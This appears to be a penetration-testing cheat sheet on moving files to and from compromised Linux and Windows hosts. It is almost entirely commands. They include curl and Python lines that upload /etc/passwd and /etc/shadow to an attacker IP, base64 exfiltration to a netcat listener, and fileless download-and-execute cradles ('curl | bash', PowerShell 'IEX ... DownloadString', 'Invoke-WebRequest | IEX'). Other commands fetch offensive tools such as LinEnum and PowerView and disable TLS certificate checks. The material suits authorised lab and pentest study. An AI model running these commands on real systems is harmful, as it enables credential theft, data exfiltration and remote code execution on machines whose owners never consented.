---
icon: cabinet-filing
---

# File Transfers

## Uploading

### Python3

***

#### Starting the Python uploadserver Module

```bash
python3 -m uploadserver
```

#### Uploading a File Using a Python One-liner

{% code overflow="wrap" %}
```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

```
{% endcode %}

#### HTTPS

```bash
sudo python3 -m pip install --user uploadserver
```

#### Pwnbox - Create a Self-Signed Certificate

{% code overflow="wrap" %}
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
{% endcode %}

#### Pwnbox - Start Web Server

```bash
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ./server.pem
```

#### Linux - Upload Multiple Files

{% code overflow="wrap" %}
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
{% endcode %}

### Alternative Web File Transfer Method

***

#### Linux - Creating a Web Server with Python3

```bash
python3 -m http.server
```

#### Linux - Creating a Web Server with Python2.7

```bash
python2.7 -m SimpleHTTPServer
```

#### Linux - Creating a Web Server with PHP

```bash
php -S 0.0.0.0:8000
```

#### Linux - Creating a Web Server with Ruby

```bash
ruby -run -ehttpd . -p8000
```

#### Download the File from the Target Machine

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

### `SMB`

#### Configuring WebDav Server

```bash
sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

#### Connect from Windows

```bash
dir \\192.168.49.128\DavWWWRoot
```

#### Uploading Files using SMB

```bash
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot
```

#### Impacket Server

```sh
impacket-smbserver [share name] [share path]
# ie: impacket-smbserver Folder ./data
```

* Then from the Windows machine, mount the share:

```powershell
net use s: \\[my ip]\[sharename]
copy [file] s:
```

### `Powershell`

#### Installing a Configured WebServer with Upload

```bash
pip3 install uploadserver
python3 -m uploadserver
```

#### PowerShell Script to Upload a File to Python Upload Server

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
{% endcode %}

#### PowerShell Base64 Web Upload

* We can listen with netcat and then send a post request from our target to our machine with the file b64 encoded, then grab that post data from our server log

{% code overflow="wrap" %}
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
{% endcode %}

* On our machine:

```bash
nc -lvnp 8000
```

* Decode:

```bash
echo <base64> | base64 -d -w 0 > hosts
```

## Downloading

### Python

***

#### FTP

```bash
$ python3 -m pyftplib 21
```

#### Python 2 - Download

{% code overflow="wrap" %}
```bash
$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
{% endcode %}

#### Python 3 - Download

{% code overflow="wrap" %}
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
{% endcode %}

### PHP

***

#### PHP Download with File\_get\_contents()

{% code overflow="wrap" %}
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
{% endcode %}

#### PHP Download with Fopen()

{% code overflow="wrap" %}
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
{% endcode %}

#### PHP Download a File and Pipe it to Bash

{% code overflow="wrap" %}
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
{% endcode %}

### Ruby

***

#### Ruby - Download a File

{% code overflow="wrap" %}
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
{% endcode %}

### Perl

***

#### Perl - Download a File

{% code overflow="wrap" %}
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
{% endcode %}

### JavaScript

***

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

#### Download a File Using JavaScript and cscript.exe

{% code overflow="wrap" %}
```powershell
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
{% endcode %}

### VBScript

***

```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

#### Download a File Using VBScript and cscript.exe

{% code overflow="wrap" %}
```powershell
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
{% endcode %}

#### Download a File Using wget

{% code overflow="wrap" %}
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
{% endcode %}

#### Download a File Using cURL

{% code overflow="wrap" %}
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
{% endcode %}

### Fileless Attacks Using Linux

***

#### Fileless Download with cURL

{% code overflow="wrap" %}
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
{% endcode %}

#### Fileless Download with wget

{% code overflow="wrap" %}
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
{% endcode %}

### SMB

***

#### Create SMB Server

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

#### Copy file from server (cmd)

```powershell
copy \\192.168.220.133\share\nc.exe
```

Newer versions of windows block unauthenticated SMB shares, we can create one with user and pass:

{% code overflow="wrap" %}
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
{% endcode %}

#### Mount SMB share with u/p

```powershell
net use n: \\192.168.220.133\share /user:test test
```

### Powershell

***

#### PowerShell DownloadFile Method

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
{% endcode %}

#### PowerShell DownloadString - Fileless Method

* runs from memory

{% code overflow="wrap" %}
```powershell
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
```
{% endcode %}

#### PowerShell Invoke-WebRequest

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest <Target File URL> -OutFile <Output File Name>
```
{% endcode %}

[Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

Occasionally IE first-launch has not run (IE engine not available), bypass with `-UseBasicParsing`

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest https://[ip]/PowerView.ps1 -UseBasicParsing | IEX
```
{% endcode %}

TLS Error

{% code overflow="wrap" %}
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
{% endcode %}
